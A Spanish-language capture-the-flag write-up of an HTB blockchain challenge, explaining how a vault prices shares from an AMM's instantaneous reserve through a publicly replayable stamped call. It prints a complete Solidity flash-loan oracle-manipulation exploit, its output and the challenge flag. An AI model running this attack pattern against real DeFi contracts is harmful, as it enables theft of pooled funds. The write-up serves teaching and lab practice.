# Caldrin's Day Away — Blockchain

**HTB Cyber Apocalypse 2026**

> Caldrin sigue el ruido hasta un pequeño Sharehouse del muelle, donde los marineros dejan
> monedas, sal y mercancías antes de sus viajes. A cambio reciben *claim-marks* que pueden
> canjear al volver. Últimamente algunos visitantes llegan con fardos modestos y vuelven
> poco después a recoger mucho más de lo esperado. Los guardianes lo llaman suerte del mar,
> pero Caldrin nota **la misma cera pálida en cada marca sospechosa**.

## Objetivo

```solidity
function isSolved() external view returns (bool) {
    return crownCoin.balanceOf(address(sharehouse)) < SOLVE_THRESHOLD; // 150_000e6
}
```

El Sharehouse empieza con `1_000_000e6` CROWN. Hay que vaciarle más del 85%.

## El terreno

Seis contratos, ninguno con `onlyOwner` roto ni reentrancy clásica:

- **`TradeToken`** — ERC20 mínimo de 6 decimales. Dos instancias: `CROWN` y `SALT`.
- **`DocksideMarket`** — AMM constant-product **sin comisión**:
  `out = in * Ro / (Ri + in)`. Sembrado con 1M/1M.
- **`PublicStampDesk`** — hace `staticcall` de órdenes cuyo `keccak256` fue pre-aprobado
  por el keeper.
- **`GoldhandCredit`** — flash loan de hasta `90_000_000e6` CROWN.
- **`DocksideSharehouse`** — la bóveda. Emite claim-marks de 18 decimales contra holdings
  de 6 decimales.
- **`Setup`** — despliega todo y regala una única "bolsa de viaje" de `10_000e6` CROWN.

## La cera pálida

El Sharehouse valora sus claim-marks contra `recordedHoldings`, una variable que **no**
se deriva de su balance real sino que se refresca a mano:

```solidity
function recountHoldings(bytes calldata stampedOrder) external {
    bytes memory result = stampDesk.readStampedOrder(stampedOrder);
    uint256 newHoldings = abi.decode(result, (uint256));
    recordedHoldings = newHoldings;
}
```

Sin control de acceso: cualquiera puede recontar. La "protección" es que el StampDesk
solo ejecuta órdenes selladas. Y en todo el sistema existe **una sola** orden sellada,
estampada en el constructor de `Setup`:

```solidity
abi.encodeWithSelector(DocksideMarket.valueCargoAsOneGood.selector, SHAREHOUSE_CARGO_POSITION, int128(0))
```

Veamos qué devuelve esa llamada:

```solidity
function valueCargoAsOneGood(uint256 cargoMarkAmount, int128 good) external view returns (uint256) {
    uint256 reserve = good == 0 ? crownReserve : saltReserve;
    return (cargoMarkAmount * reserve) / totalCargoMarks;
}
```

Con `cargoMarkAmount == totalCargoMarks == 1_000_000e6`, la fracción se cancela y el
resultado es **`crownReserve` en crudo**.

Ahí está la trampa: el sello garantiza que la llamada es siempre *la misma*, pero no que
el *valor devuelto* sea estable. `recordedHoldings` acaba siendo un alias del precio spot
de un AMM. Es el mismo error de siempre — un oráculo leído de la reserva instantánea de
un pool — solo que envuelto en una capa de "autorización" que distrae. La misma cera
pálida en cada marca: todas las recuentas usan exactamente los mismos bytes, y esos bytes
son públicos porque `Setup.buildPublicRecountOrder()` es `public view`.

Y `recordedHoldings` fija el precio en **ambas** direcciones:

```solidity
// comprar marks
claimMarkAmount = (crownCoinAmount * totalClaimMarks) / recordedHoldings;
// venderlos
crownCoinAmount = (claimMarkAmount * recordedHoldings) / totalClaimMarks;
```

Compra barato con el oráculo bajo, vende caro con el oráculo alto.

## Lo que el reto no te deja hacer

Tres restricciones dan forma al ataque, y merecen atención porque descartan el enfoque
ingenuo:

**1. El depósito no cabe dentro del flash loan.**

```solidity
require(goldhandCredit.activeBorrower() == address(0), "LOAN_ACTIVE");
```

`leaveGoods` se niega a ejecutarse mientras haya un préstamo vivo. Así que no puedes
hacer el ciclo completo (deprimir oráculo → depositar → inflar oráculo → redimir) en una
sola transacción prestada. Depósito fuera, recount y redeem dentro.

**2. El capital está capado.** `takeTravelPurse()` tiene un flag global de un solo uso y
`leaveGoods` está limitado por `travelPurseCredit`. Son `10_000e6` CROWN, y no hay más.

**3. La reserva CROWN no se puede bajar.** Para deprimir el oráculo habría que vender SALT
al pool. Pero el único SALT del mundo sale de ese mismo pool, y en un constant-product
**sin comisión** el round-trip es exactamente lossless:

```
Ri' = Ri + in
Ro' = Ro - in*Ro/(Ri+in) = Ro*Ri/(Ri+in)
Ri' * Ro' = Ri * Ro        ← el producto se conserva exacto
```

Devolver todo el SALT que compraste deja `crownReserve` justo donde estaba. No hay forma
de empujarlo por debajo de `1_000_000e6`.

La consecuencia es elegante: el "oráculo bajo" no hay que fabricarlo, **ya está ahí**.
Es el valor honesto inicial. Solo hay que depositar antes de tocar nada.

## El ataque

```
1. takeTravelPurse()                          → 10_000e6 CROWN + crédito de bolsa
2. leaveGoods(10_000e6)   @ R = 1_000_000e6   → marks = 1e10 · 9.9e23 / 1e12 = 9.9e21
3. borrowForOneCall(90_000_000e6):
     3a. trade CROWN→SALT (90M)               → crownReserve: 1M → 91M   (×91)
     3b. recountHoldings(ordenSellada)        → recordedHoldings = 91_000_000e6
     3c. redeemClaim(9.9e21)                  → 900_990.099009e6 CROWN
     3d. trade SALT→CROWN (todo) y repagar
```

El paso 2 es el que decide todo. Con el oráculo honesto, `10_000e6` CROWN compran
`9.9e21` claim-marks sobre un suministro que pasa a `9.999e23` — exactamente **1/101**
del total, por el 1% del valor declarado de la bóveda.

Lo que importa no es cuánto depositas sino esa ratio, congelada a precio honesto. El
payout final es simplemente:

```
payout = marks · R_high / totalMarks = R_high / 101 = 9.1e13 / 101 = 900_990.099009e6
```

El botín escala con `R_high`, y `R_high` está capado por la liquidez del flash loan.
Con los 90M de Goldhand llegamos a ×91, y eso basta de sobra.

El exploit, íntegro:

```solidity
function run() external {
    setup.takeTravelPurse();

    crownCoin.approve(address(sharehouse), type(uint256).max);
    uint256 marks = sharehouse.leaveGoods(TRAVEL_PURSE);

    goldhandCredit.borrowForOneCall(LOAN, abi.encode(marks));
}

function onQuayLoan(uint256 amount, bytes calldata data) external override {
    require(msg.sender == address(goldhandCredit), "NOT_LENDER");
    uint256 marks = abi.decode(data, (uint256));

    crownCoin.approve(address(quayMarket), type(uint256).max);
    uint256 saltOut = quayMarket.trade(int128(0), int128(1), amount, 0);

    sharehouse.recountHoldings(setup.buildPublicRecountOrder());
    sharehouse.redeemClaim(marks);

    saltGoods.approve(address(quayMarket), type(uint256).max);
    quayMarket.trade(int128(1), int128(0), saltOut, 0);

    require(crownCoin.transfer(msg.sender, amount), "REPAY_FAILED");
}
```

Un detalle del paso 3d: el round-trip pierde **90 unidades** (0.00009 CROWN) por el
redondeo hacia abajo de dos divisiones enteras consecutivas. Volvemos con
`89_999_999_999_910` de los `90_000_000_000_000` prestados. Trivial de cubrir con el
botín, pero conviene repagar desde el balance propio y no asumir que el swap inverso
devuelve la cifra exacta — `require(coin.balanceOf(this) >= balanceBefore)` no perdona.

## Resultado

```
sharehouse CROWN inicial: 1000000.000000
sharehouse CROWN final  :  109009.900991   ← < 150_000 ✓
umbral                  :  150000.000000
botín del atacante      :  900990.098919
crownReserve final      : 1000000.000090
```

`isSolved() == true`. El market queda prácticamente intacto — 90 unidades de más —
así que ni siquiera queda rastro en la liquidez del muelle. Solo un Sharehouse vacío
y otra marca de cera pálida.

Contra la instancia remota el balance final salió `109009900991`, idéntico al dígito:

```
HTB{inquir3y_0ne_c4ldr1n_s0lv3d_65c005a8574da15a8d9a7e2c9220d220}
```

## La lección

El sello del StampDesk es seguridad de cargo cult: autentica *qué llamada* se hace pero
no *qué devuelve*. Cualquier oráculo que resuelva a la reserva instantánea de un pool es
manipulable por quien pueda mover esa reserva, y un flash loan hace que "quien pueda" sea
literalmente cualquiera. Firmar la pregunta no valida la respuesta.
